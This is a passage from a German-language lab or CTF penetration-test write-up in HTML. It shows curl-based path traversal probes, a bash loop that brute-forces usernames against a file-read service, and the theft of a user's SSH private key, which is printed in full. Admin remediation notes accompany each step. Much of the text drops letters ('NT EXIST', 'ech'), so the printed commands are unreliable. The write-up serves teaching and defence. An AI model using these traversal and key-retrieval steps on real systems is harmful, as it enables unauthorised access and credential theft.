+<!-- <span class="command">eArJNeGYVKiJEnACLPuxnbmUHiTxLdHMV</span> -->
+</pre>
+                </div>
+            </div>
+
+             <p class="comment">
+                <strong>Analyse:</strong> Ich probiere einen dritten zufälligen String (`eArJNeGYVKiJEnACLPuxnbmUHiTxLdHMV`) als Pfad aus. Die Antwort ist wieder die gleiche Struktur: "OBSERVING FILE: /home/eArJNeGYVKiJEnACLPuxnbmUHiTxLdHMV NOT EXIST" und ein neuer Kommentarstring (`<!-- AzSIJZZfdlkEkUhInBJKbLNZVWbQFSHMV -->`). Dies festigt das Muster des Dienstverhaltens.
+                <br><strong>Bewertung:</strong> Es wird klar, dass der Dienst jeden angefragten Pfad an `/home/` anhängt und immer einen neuen dynamischen String ausgibt, wenn die resultierende "Datei" nicht existiert. Der Fokus muss auf der Pfadmanipulation liegen, um aus `/home/` auszubrechen. Die dynamischen Strings im Kommentar scheinen irrelevant für die Ausnutzung der Dateilese-Funktion zu sein.
+                <br><strong>Empfehlung (Pentester):</strong> Setze Path Traversal-Versuche fort. Das Ziel ist, auf bekannte Systemdateien zuzugreifen, um das Verhalten des Dienstes beim erfolgreichen Dateilesen zu beobachten und weitere Informationen über das System zu sammeln.
+                <br><strong>Empfehlung (Admin):</strong> Die wiederholte Anzeige interner Pfade und die Reaktion auf nicht existierende Dateien basierend auf Benutzereingaben ist ein klares Indiz für eine mangelhafte Eingabevalidierung.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl http://192.168.2.213:3333/eArJNeGYVKiJEnACLPuxnbmUHiTxLdHMV</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+BSERVING FILE: /home/eArJNeGYVKiJEnACLPuxnbmUHiTxLdHMV NT EXIST 
+
+
+<!-- <span class="command">AzSIJZZfdlkEkUhInBJKbLNZVWbQFSHMV</span> -->
+</pre>
+                </div>
+            </div>
+
+            <p class="comment">
+                <strong>Analyse:</strong> Ein weiterer Versuch mit dem aktuellen dynamischen String (`AzSIJZZfdlkEkUhInBJKbLNZVWbQFSHMV`) als Pfad liefert das erwartete Ergebnis: "OBSERVING FILE: /home/AzSIJZZfdlkEkUhInBJKbLNZVWbQFSHMV NOT EXIST" und ein neuer Kommentar (`<!-- wLLLjulmlgSMIgzhHVWxVIewOldUuHHMV -->`). Das Muster ist nun eindeutig.
+                <br><strong>Bewertung:</strong> Die Wiederholung dieses Verhaltens bestätigt, dass die dynamischen Strings im Kommentar nicht direkt als Dateinamen oder Pfade funktionieren, die zu einer anderen Reaktion führen. Der Fokus liegt weiterhin auf der Ausnutzung der "OBSERVING FILE"-Funktion durch Path Traversal. Die dynamischen Strings scheinen eher eine Art Indikator oder Zähler zu sein, der bei jedem fehlgeschlagenen Versuch aktualisiert wird.
+                <br><strong>Empfehlung (Pentester):</strong> Vernachlässige die dynamischen Strings im Kommentar. Konzentriere deine Bemühungen auf Path Traversal.
+                <br><strong>Empfehlung (Admin):</strong> Vermeiden Sie dynamische oder identifizierende Strings in Fehlermeldungen oder Kommentaren, die Angreifern Hinweise auf das Systemverhalten geben könnten.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl http://192.168.2.213:3333/AzSIJZZfdlkEkUhInBJKbLNZVWbQFSHMV</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+BSERVING FILE: /home/AzSIJZZfdlkEkUhInBJKbLNZVWbQFSHMV NT EXIST 
+
+
+<!-- <span class="command">wLLLjulmlgSMIgzhHVWxVIewOldUuHHMV</span> -->
+</pre>
+                </div>
+            </div>
+
+            <p class="comment">
+                <strong>Analyse:</strong> Hier probiere ich einen alternativen Ansatz der Interaktion mit dem Dienst, indem ich `nc` (Netcat) verwende, um eine direkte TCP-Verbindung zu Port 3333 herzustellen und manuell Befehle oder Eingaben zu senden. Ich sende den einfachen String "id", um zu sehen, wie der Dienst reagiert. Die Antwort ist `HTTP/1.1 400 Bad Request`, gefolgt von `Content-Type: text/plain; charset=utf-8`, `Connection: close` und erneut `400 Bad Request`. Dies zeigt, dass der Dienst nicht einfach beliebige Strings als Befehle interpretiert, sondern spezifisch auf HTTP-Protokollstrukturen reagiert. Meine direkte Eingabe "id" wurde nicht als gültige HTTP-Anfrage erkannt.
+                <br><strong>Bewertung:</strong> Dieser Test bestätigt, dass der Dienst ein HTTP-Server ist und auf HTTP-konforme Anfragen wartet. Meine vorherigen `curl`-Versuche, die HTTP-Anfragen gesendet haben, waren der korrekte Weg zur Interaktion. Der Versuch, mit `nc` Rohdaten zu senden, hat gezeigt, dass der Dienst nicht für eine einfache Telnet-ähnliche Interaktion ausgelegt ist.
+                <br><strong>Empfehlung (Pentester):</strong> Wenn du die Interaktion mit einem Dienst testest, probiere sowohl protokollspezifische Tools (wie `curl` für HTTP) als auch generische Tools (wie `nc`) aus, um das genaue Kommunikationsprotokoll und -verhalten zu ergründen. Wenn ein Dienst als HTTP identifiziert wurde, bleibe bei HTTP-konformen Anfragen.
+                <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Dienste nur auf das von ihnen erwartete Protokoll reagieren und unprotokollgemäße Verbindungsversuche oder Eingaben korrekt und sicher behandeln (z.B. durch sofortiges Schließen der Verbindung und geeignete Log-Einträge).
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nc -nv 192.168.2.213 3333</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+(UNKNOWN) [<span class="command">192.168.2.213</span>] <span class="command">3333</span> (?) pen
+id
+<span class="command">HTTP/1.1 400 Bad Request</span>
+<span class="command">Cntent-Type: text/plain; charset=utf-8</span>
+<span class="command">Cnnexion: clse</span>
+
+<span class="command">400 Bad Request</span>  
+</pre>
+                </div>
+            </div>
+
+             <p class="comment">
+                <strong>Analyse:</strong> Ich wiederhole hier die vorherigen Schritte, die das Verhalten des Dienstes zeigen: Der Versuch, den dynamischen String (`uNazQidVZMSrCEOzFpeaAEUepTAvtqHMV`) mit `base64 -d` zu dekodieren, schlägt fehl ("base64: ungültige Eingabe"), und der `curl`-Versuch, diesen String als Pfad zu verwenden, führt erneut zur "OBSERVING FILE: ... NOT EXIST" Meldung und einem neuen Kommentar (`<!-- TRPXnNaVehDOFIvCDdtdwgWZHzfgZxHMV -->`). Dies sind wiederholte Tests, die mein Verständnis des Dienstverhaltens festigen.
+                <br><strong>Bewertung:</strong> Die Wiederholung dieser Tests unterstreicht die Konsistenz des Dienstverhaltens und die Unwahrscheinlichkeit, dass die dynamischen Strings direkte base64-kodierte Informationen sind. Es bestätigt, dass die Hauptangriffsfläche die "OBSERVING FILE"-Funktion und die Art und Weise ist, wie Pfade verarbeitet werden.
+                <br><strong>Empfehlung (Pentester):</strong> Dokumentiere wiederholte Testergebnisse, um die Konsistenz des Systemverhaltens zu belegen. Konzentriere dich nach der Validierung des Verhaltens auf die Ausnutzung der identifizierten Schwachstelle (Path Traversal/LFI).
+                <br><strong>Empfehlung (Admin):</strong> Analysieren Sie Log-Dateien auf wiederholte oder ungewöhnliche Anfragen, die auf Erkundungsversuche hindeuten, wie z.B. das wiederholte Anfragen mit dynamischen Strings.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">ech 'uNazQidVZMSrCEOzFpeaAEUepTAvtqHMV' -n | base64 -d</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+�ֳB'UdC���E�0/���<span class="password">base64: ungültige Eingabe</span>
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl http://192.168.2.213:3333/uNazQidVZMSrCEOzFpeaAEUepTAvtqHMV</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+BSERVING FILE: /home/uNazQidVZMSrCEOzFpeaAEUepTAvtqHMV NT EXIST 
+
+
+<!-- <span class="command">TRPXnNaVehDOFIvCDdtdwgWZHzfgZxHMV</span> -->  
+</pre>
+                </div>
+            </div>
+
+             <p class="comment">
+                <strong>Analyse:</strong> Ich wiederhole hier ebenfalls einen `curl`-Versuch mit dem dynamischen String (`AzSIJZZfdlkEkUhInBJKbLNZVWbQFSHMV`) als Pfad, was erneut zur "OBSERVING FILE: ... NOT EXIST" Meldung und einem neuen Kommentar (`<!-- UChowyXQFtWCKrRaQikzfawWUDxTqbHMV -->`) führt. Die Wiederholung festigt das Verständnis des Dienstverhaltens weiter.
+                <br><strong>Bewertung:</strong> Dieses konstante Verhalten, bei dem jeder nicht existierende Pfad, selbst ein zufälliger String, zur gleichen Fehlermeldung und einem neuen dynamischen Kommentarstring führt, macht deutlich, dass die dynamischen Strings im Kommentar nicht die Schlüssel zur Ausnutzung sind. Die Kernschwachstelle liegt in der Art und Weise, wie der Dienst mit Dateipfaden umgeht.
+                <br><strong>Empfehlung (Pentester):</strong> Verschwende keine weitere Zeit mit der Analyse der dynamischen Kommentarstrings. Der Weg zur Kompromittierung liegt in der Ausnutzung der Dateipfadverarbeitung.
+                <br><strong>Empfehlung (Admin):</strong> Achten Sie auf sich wiederholende Muster in den Log-Dateien, die auf das Ausprobieren verschiedenster Pfade oder zufälliger Strings hindeuten, was auf eine aktive Erkundung durch einen Angreifer hindeutet.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl http://192.168.2.213:3333/AzSIJZZfdlkEkUhInBJKbLNZVWbQFSHMV</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+BSERVING FILE: /home/AzSIJZZfdlkEkUhInBJKbLNZVWbQFSHMV NT EXIST 
+
+
+<!-- <span class="command">UChowyXQFtWCKrRaQikzfawWUDxTqbHMV</span> -->
+</pre>
+                </div>
+            </div>
+
+            <p class="comment">
+                <strong>Analyse:</strong> Basierend auf den vorherigen Beobachtungen, dass der Dienst angefragte Pfade an `/home/` anhängt und versucht, diese zu "beobachten", versuche ich nun, die Path Traversal-Schwachstelle auszunutzen, um auf die `/etc/passwd` zuzugreifen. Ich beginne mit einem relativen Pfad `../etc/passwd`. Die Antwort ist "OBSERVING FILE: /home/etc/passwd NOT EXIST", gefolgt von einem neuen Kommentar (`<!-- iwmHJkOUVqiHbexlfmHtmHEqejNKpnHMV -->`). Das bedeutet, dass der Dienst meine `../` Sequenz nicht interpretiert, wie ich es erwarte, oder die Pfadnormalisierung anders handhabt. Ich probiere verschiedene Kombinationen von `../` und verschiedenen relativen/absoluten Pfadstrukturen aus (`../../../etc/passwd`, `.../../../etc/passwd`, `...../../../etc/passwd`, `...../....../../etc/passwd`, `...../....../....../etc/passwd`). Alle diese Versuche führen ebenfalls zur gleichen "OBSERVING FILE: /home/... NOT EXIST" Fehlermeldung. Dies zeigt, dass der Dienst diese `../` Muster nicht als Verzeichniswechsel interpretiert oder dass meine Pfade falsch aufgebaut sind, um aus `/home/` auszubrechen.
+                <br><strong>Bewertung:</strong> Meine ersten Versuche, Path Traversal mittels `../` auszunutzen, schlugen fehl, da der Dienst meine Eingaben nicht wie erwartet verarbeitet. Er scheint die relativen Pfade nicht zu normalisieren, bevor er sie an `/home/` anhängt. Dies erfordert einen anderen Ansatz zur Pfadmanipulation.
+                <br><strong>Empfehlung (Pentester):</strong> Wenn Standard-Path Traversal-Muster fehlschlagen, experimentiere mit alternativen Schreibweisen oder Kodierungen von Pfaden (z.B. doppelte Slashes `//`, URL-Kodierung `%2f`, Null-Bytes `%00`) oder suche nach Beispielen, wie die Anwendung interne Pfade behandelt.
+                <br><strong>Empfehlung (Admin):</strong> Implementieren Sie eine robuste Pfadnormalisierung und Validierung, die alle Formen von Path Traversal-Angriffen (einschließlich kodierter oder alternativer Schreibweisen) erkennt und blockiert, bevor die Pfade intern verwendet werden. Nutzen Sie Funktionen, die speziell für die sichere Handhabung von Dateipfaden konzipiert sind.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl http://192.168.2.213:3333/../etc/passwd</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+BSERVING FILE: /home/etc/passwd NT EXIST 
+
+
+<!-- <span class="command">iwmHJkOUVqiHbexlfmHtmHEqejNKpnHMV</span> -->
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl http://192.168.2.213:3333/../../../etc/passwd</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+BSERVING FILE: /home/etc/passwd NT EXIST 
+
+
+<!-- <span class="command">uJIPIMQrlzoAzOtNGJvjLAXHOzJtsbHMV</span> -->
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl http://192.168.2.213:3333/.../../../etc/passwd</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+BSERVING FILE: /home/etc/passwd NT EXIST 
+
+
+<!-- <span class="command">rgftzyCOSPwZNfpylHwPqIVJGpGdQHMV</span> -->
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl http://192.168.2.213:3333/...../../../etc/passwd</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+BSERVING FILE: /home/etc/passwd NT EXIST 
+
+
+<!-- <span class="command">LgYjneiNDVVDCZlUtAfKbfRHKgEfnHMV</span> -->
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl http://192.168.2.213:3333/...../....../../etc/passwd</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+BSERVING FILE: /home/...../etc/passwd NT EXIST 
+
+
+<!-- <span class="command">DazTXVryEczTtfFlaYaGjWqhBjgAIVHMV</span> -->
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl http://192.168.2.213:3333/...../....../....../etc/passwd</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+BSERVING FILE: /home/...../....../....../etc/passwd NT EXIST 
+</pre>
+                </div>
+            </div>
+
+            <p class="comment">
+                <strong>Analyse:</strong> Nach den fehlgeschlagenen Versuchen mit Standard-`../` Notation, probiere ich eine alternative Schreibweise für Path Traversal, indem ich doppelte Slashes (`//`) verwende: `..//..//..//..//etc/passwd`. Diesmal erhalte ich eine völlig andere Antwort: `<a href="/etc/passwd">Moved Permanently</a>`. Dies ist eine HTTP 301 Moved Permanently Weiterleitung. Der Dienst interpretiert diese spezielle Pfadstruktur so, dass sie auf `/etc/passwd` verweist, und leitet mich dorthin weiter, anstatt sie einfach an `/home/` anzuhängen und nach einer Datei zu suchen. Ein weiterer Versuch mit einem `file:///` Schema (`..//..//..//..//../file:///etc/passwd`) führt ebenfalls zu einer `Moved Permanently` Weiterleitung auf `/file:/etc/passwd`.
+                <br><strong>Bewertung:</strong> Fantastisch! Das Experimentieren mit alternativen Pfadschreibweisen war erfolgreich. Die Verwendung von `..//` gefolgt vom absoluten Pfad `/etc/passwd` wird vom Dienst korrekt als Verweis auf die Systemdatei `/etc/passwd` interpretiert. Die Weiterleitung selbst zeigt noch nicht den Inhalt der Datei, aber sie beweist, dass ich den Dienst dazu bringen kann, auf Systemressourcen zu verweisen. Dies ist ein klarer Proof of Concept für eine Path Traversal-Schwachstelle.
+                <br><strong>Empfehlung (Pentester):</strong> Wenn eine Path Traversal-Schwachstelle durch Weiterleitungen bestätigt wird, versuche, die Weiterleitung zu verfolgen (`curl -L`) oder andere Methoden zu finden, die den Inhalt direkt anzeigen, anstatt weiterzuleiten. Dokumentiere die genaue Schreibweise des Pfades, die funktioniert hat.
+                <br><strong>Empfehlung (Admin):</strong> Die Anwendung ist anfällig für Path Traversal. Implementieren Sie eine strikte Filterung und Normalisierung aller Benutzereingaben, die als Dateipfade verwendet werden. Leiten Sie niemals auf externe oder unsichere Ressourcen basierend auf Benutzereingaben weiter.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl "http://192.168.2.213:3333/..//..//..//..//etc/passwd"</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<a href="/etc/passwd">Mved Permanently</a>.
+</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl "http://192.168.2.213:3333/..//..//..//..//../file:///etc/passwd"</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<a href="/file:/etc/passwd">Mved Permanently</a>.
+</pre>
+                </div>
+            </div>
+
+            <p class="comment">
+                <strong>Analyse:</strong> Die wiederholten Versuche und die "OBSERVING FILE" Meldung deuten darauf hin, dass der Dienst versucht, Dateien *innerhalb* oder *relativ* zu einem Basispfad (wahrscheinlich `/home/`) zu verarbeiten. Die Weiterleitung bei `/etc/passwd` zeigt, dass bestimmte Systempfade anders behandelt werden. Ich erinnere mich an die Nmap-Ausgabe, die "OBSERVING FILE: /home/ NOT EXIST" zeigte. Was, wenn der Dienst versucht, Dateien im Home-Verzeichnis von *Benutzern* zu beobachten? Und was, wenn das dynamische Ende des HTML-Kommentars vielleicht ein Hinweis auf den *Dateinamen* innerhalb dieses Home-Verzeichnisses ist, der beobachtet wird? Ich habe eine Liste mit Benutzernamen (`/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt`) und möchte prüfen, ob einer dieser Benutzernamen auf dem System existiert und ob der Dienst anders reagiert, wenn ich versuche, eine bekannte Datei innerhalb seines Home-Verzeichnisses anzufordern, z.B. `.bash_history`.
+                Ich setze einen `while read` Loop auf, der jede Zeile (jeden Benutzernamen) aus der SecLists-Datei liest. Innerhalb der Schleife führe ich für jeden Benutzernamen (`$i`) einen `curl`-Befehl aus, der versucht, die Datei `/$i/.bash_history` anzufordern, angehängt an die Basis-URL des Dienstes auf Port 3333. Ich verwende `-s` für den Silent-Modus (keine Fortschrittsanzeige) und speichere die Antwort in der Variable `response`. Dann prüfe ich mit `grep -q "NOT EXIST"`, ob die Antwort die Fehlermeldung "NOT EXIST" enthält. Wenn die Fehlermeldung *nicht* vorhanden ist (`! echo "$response" | grep -q "NOT EXIST"`), bedeutet dies, dass der Dienst anders reagiert hat – möglicherweise, weil die Datei (`.bash_history`) im Home-Verzeichnis dieses Benutzers existiert. In diesem Fall gebe ich den gefundenen Benutzernamen aus und breche die Schleife ab (`break`).
+                Fantastisch! Der Loop findet schnell den Benutzernamen "jan". Dies bestätigt meine Hypothese: Der Dienst reagiert anders, wenn eine existierende Datei im Home-Verzeichnis eines Benutzers angefragt wird. Das Home-Verzeichnis von 'jan' existiert offenbar, und die Datei `.bash_history` existiert darin.
+                <br><strong>Bewertung:</strong> Die Bruteforce-Methode auf Basis der Dienstantwort war äußerst effektiv. Die Identifizierung des Benutzers "jan" und die Bestätigung, dass `.bash_history` in dessen Home-Verzeichnis existiert (da die "NOT EXIST" Meldung nicht kam), ist ein entscheidender Fortschritt. Die Möglichkeit, scheinbar beliebige Dateien im Home-Verzeichnis von 'jan' anzufordern, öffnet den Weg zu potenziell sensiblen Dateien.
+                <br><strong>Empfehlung (Pentester):</strong> Wenn ein Dienst Dateipfad-bezogene Informationen preisgibt oder unterschiedlich auf existierende/nicht existierende Dateien reagiert, nutze dies für Benutzer- oder Dateiaufzählung. Versuche als Nächstes, kritische Dateien im Home-Verzeichnis des gefundenen Benutzers auszulesen, insbesondere `.ssh/id_rsa`.
+                <br><strong>Empfehlung (Admin):</strong> Implementieren Sie generische Fehlermeldungen, die keine Unterschiede zwischen "Datei nicht gefunden" und "Pfad ungültig" oder "Benutzer nicht gefunden" machen, um Angreifern die Enumeration zu erschweren. Beschränken Sie den Zugriff auf sensible Dateien wie `.bash_history` oder `.ssh`-Verzeichnisse, auch für normale Benutzer, wenn diese nicht zwingend notwendig sind.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">while read -r i; d</span>
+  <span class="command">respnse=$(curl -s "http://192.168.2.213:3333/$i/.bash_history")</span>
+
+  <span class="command">if ! ech "$respnse" | grep -q "NT EXIST"; then</span>
+    <span class="command">ech "Username gefunden: $i"</span>
+    <span class="command">break</span>
+  <span class="command">fi</span>
+<span class="command">dne < /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt</span></div>
+                </div>
+                <div class="terminal">
+                    <pre><span class="command">Username gefunden: jan</span></pre>
+                </div>
+            </div>
+
+            <p class="comment">
+                <strong>Analyse:</strong> Nachdem ich den Benutzernamen `jan` gefunden habe und weiß, dass ich Dateien in seinem Home-Verzeichnis anfordern kann, ist mein nächstes logisches Ziel, den Inhalt der privaten SSH-Schlüsseldatei zu erhalten: `/home/jan/.ssh/id_rsa`. Der Befehl `curl "http://192.168.2.213:3333/jan/.ssh/id_rsa"` sendet die entsprechende Anfrage an den Dienst auf Port 3333. Die Antwort enthält tatsächlich den vollständigen Inhalt der Datei `/home/jan/.ssh/id_rsa`, beginnend mit `-----BEGIN OPENSSH PRIVATE KEY-----`.
+                <br><strong>Bewertung:</strong> Fantastisch! Der erfolgreiche Zugriff auf die private SSH-Schlüsseldatei ist ein kritischer Durchbruch und ermöglicht mir die Erlangung des initialen Zugriffs auf das System. Die Kombination aus der Path Traversal/LFI-Schwachstelle und der Existenz einer SSH-Schlüsseldatei im Home-Verzeichnis des gefundenen Benutzers ist eine schwerwiegende Sicherheitsproblematik.
+                <br><strong>Empfehlung (Pentester):</strong> Wenn du eine Dateilese-Schwachstelle findest und Benutzernamen identifizierst, versuche immer, auf `.ssh/id_rsa` zuzugreifen. Diese Datei ist ein direkter Schlüssel zum SSH-Zugriff, oft ohne dass ein Passwort benötigt wird, solange die Datei nicht passwortgeschützt ist. Speichere die gefundene Schlüsseldatei umgehend lokal.
+                <br><strong>Empfehlung (Admin):</strong> Schützen Sie private SSH-Schlüsseldateien (`id_rsa`) streng. Speichern Sie sie niemals in öffentlich zugänglichen Verzeichnissen (wie einem Web-Root oder einem Verzeichnis, auf das ein anfälliger Dienst zugreifen kann). Nutzen Sie für private Schlüssel immer eine Passphrase. Überprüfen Sie Dateiberechtigungen (`chmod 600`) und stellen Sie sicher, dass sensible Dateien nicht für andere Benutzer lesbar sind. Auditen Sie regelmäßig die Inhalte von Home-Verzeichnissen auf potenziell gefährliche Dateien.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl "http://192.168.2.213:3333/jan/.ssh/id_rsa"</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">-----BEGIN PENSSH PRIVATE KEY-----</span>
+<span class="password">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span>
+<span class="password">NhAAAAAwEAAQAAAYEA6Tzy2uBhFIRLYnINwYIinc+8TqNZap0CB7Ol3HSnBK9Ba9pGOSMT</span>
+<span class="password">Xy2J8eReFlni3MD5NYpgmA67cJAP3hjL9hDSZK2UaE0yXH4TijjCwy7C4TGlW49M8Mz7b1</span>
+<span class="password">LsH5BDUWZKyHG/YRhazCbslVkrVFjK9kxhWrt1inowgv2Ctn4kQWDPj1gPesFOjLUMPxv8</span>
+<span class="password">fHoutqwKKMcZ37qePzd7ifP2wiCxlypu0d2z17vblgGjI249E9Aa+/hKHOBc6ayJtwAXwc</span>
+<span class="password">ivKmNrJyrSLKo+xIgjF5uV0grej1XM/bXjv39Z8XF9h4FEnsfzUN4MmL+g8oclsaO5wgax</span>
+<span class="password">5X3Avamch/vNK3kiQO2qTS1fRZU6T7O9tII3NmYDh00RcpIZCEAztSsos6c1BUoj6Rap+K</span>
+<span class="password">s1DZQzamQva7y4Grit+UmP0APtA0vZ/vVpqZ+259CXcYvuxuOhBYycEdLHVEFrKD4Fy6QE</span>
+<span class="password">kC27Xv6ySoyTvWtL1VxCzbeA461p0U0hvpkPujDHAAAFiHjTdqp403aqAAAAB3NzaC1yc2</span>
+<span class="password">EAAAGBAOk88trgYRSES2JyDcGCIp3PvE6jWWqdAgezpdx0pwSvQWvaRjkjE18tifHkXhZZ</span>
+<span class="password">4tzC+TWKYJgOu3CQD94Yy/YQ0mStlGhNMlx+E4o4wsMuwuExpVuPMDM+29S7H5HDULmSr</span>
+<span class="password">hxv2EYRaszm7JVLKrVLjK9kxhWrt1inowgl2Lrtn4kQWHPj1gPesFNjLMPxv8</span>
+<span class="password">fHutrqwKLMcZ37qePzd7ifP2wiHxlypu0d2z17vblgHjI249ETHa+/hKHNC+6ayJtwL8HClrypNrJyrSi</span>
+<span class="password">yqPsSIIxfLldIK3o9VzP21479/WfFlxfYeFRI7H81DeHJx/HHCClsLHsHICAseVLwL2pnsIf7</span>
+<span class="password">zSl5IkDtqk0lX0LVSk+zvbSCNtZmAHTREKSGHAM7UlLrnc1HUDj6RLq+KirNDZUMzmQL2</span>
+<span class="password">u8uLqrflLmPHTNL2f71ampftuPLlHGL7stjHQSGnRHLSG1RVBayg+FyskBJtL27Xv6ySyM</span>
+<span class="password">k71rSLVxcLsbeHntadFNIS6LD7owxAAAAAMEAHEJ6Rrkgl+NUSmMGCPJvG4umwmwM</span>
+<span class="password">ptRXdZxslsxr4T9AwzeTSDPejR0AzdUk34dYHj2n1bWzGl5bgs3FJWX0yHaLvcc/QuHJyy</span>
+<span class="password">1IqMu0npLhQ59J9G+AXBHRLeLedlg5NNEMr9ux/iyVRPNT1LV5m/jNeqSIUHIRSGHM3EIvY</span>
+<span class="password">wxRz4wvGzh7YECMItvHhSJgQYU4Eqfme9MTcG+HJx31iHzXegjQNZuKntzyyHMuhHSjXiux</span>
+<span class="password">r6C/Pp/fLnaz+QbRw/rsmZlhmtkpFwnL5QWLllWRUhHIzhzHkxENELerf4VcRdXrL9H</span>
+<span class="password">DMTf7xjHLDWF23pSljf4GSGHM53LNzvJ8GV8zFYLJeX02eiwn4GiY2lbHM1MTAPsVM7e</span>
+<span class="password">Rbp9/U9wt7vpRJETHAQusQkQtR+h6LztzdkHtLszyhY/SIIusReYHpJRtbQu7Ebhrm+HS</span>
+<span class="password">/HM7EIWQ8aH576LuXL2d4kHIRAyiE3XtislruteuHLW6/xX85fnuPvRLyx8e8j6O8REAAAA</span>
+<span class="password">wEhNxgsacrvsSrdBGNGif6/2k8rPnppHRLitTcSrckQIBjYxKeLf7i+GHjBIUkYlLkwGDO</span>
+<span class="password">fWApUSugEzxUX3VyhkHHaHi+7Ijy2GuAHQO1WsN4gS3xv9HMNjiH27HTvkSyx6SFeCYX</span>
+<span class="password">t5BuyKDzk82rWj2U7HxkHrmuHSISPy8KeX1I2H973qyDaV0GrSUHEPa3Hs6IZKpYOrH+H</span>
+<span class="password">4WTtrp2E74HGPy+TaBratQZe6HlpEtKL01+n8k5uwHfa8CLAAAAMEH9p0hlgVu1qY8MHFa</span>
+<span class="password">JxNh2PsuLkRpxBHg+gbQX+PSCHHsVx8NHD5VLdUlnr7YsgubS8krNfJSYifMRHRT/2WHJk2</span>
+<span class="password">U5mtYFUYwgCK4HTPC9IzVnRB1hcrrHDS8rHSZV3H5gLyUSHHHz+HiNujym+95UrH644iE1</span>
+<span class="password">0umTs7tKEuZzmFiJBBUL+q97+1QHx6XiIVJs1gbPLmNI6SlXcVh25UHPDGUL+gPpc6Gjsj</span>
+<span class="password">vquxtHtLtcvp+OgiHK6haNLqXbNbyrAAAAwQHyHX3sHMhbZLIu35XxlNSNINHOijXyimx1</span>
+<span class="password">pvHHLbImNyvIN49+b3mHfahKJp1n7cbsl0ypNSSaCPZp7iHdKSFHsxEuHIb0UyRBHIRmXw</span>
+<span class="password">zz2HKT58znZblXibrawxLH7SEHHL6Z/IHfymHRnTehkHRPnk1ULJaH+Zxh09/f/HLxu</span>
+<span class="password">NkCnLHLC0qznH5Bx7EPENbPHaq6HDefWciYzy1yrHDOdnUSlnGtS/TL1tBfgzZbwL4L6n</span>
+<span class="password">U+HPQBwHQPpFUAAAAMamFuQG9ic2VydmVyAQIDBAUGBw==</span>
+<span class="password">-----END PENSSH PRIVATE KEY-----</span>
+</pre>
+                </div>
+            </div>
+
+          </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+             <p class="comment">
+                <strong>Analyse:</strong> Nachdem ich die private SSH-Schlüsseldatei für den Benutzer `jan` über die Dateilese-Schwachstelle auf Port 3333 erhalten habe, ist der nächste logische Schritt, diese Datei für den SSH-Zugriff vorzubereiten. Der `curl` Befehl mit dem `-s` Schalter lädt die Datei im Silent-Modus herunter und der `--output idrsa` Schalter speichert sie unter dem Namen `idrsa` auf meinem lokalen System. Anschließend setze ich die Dateiberechtigungen der `idrsa`-Datei mit `chmod 600 idrsa`. Dies ist ein kritischer Schritt, da der SSH-Client standardmäßig die Verwendung privater Schlüssel mit unsicheren Berechtigungen (z.B. weltlesbar) verweigert. `chmod 600` setzt die Berechtigungen so, dass nur der Eigentümer (ich) die Datei lesen und schreiben kann.
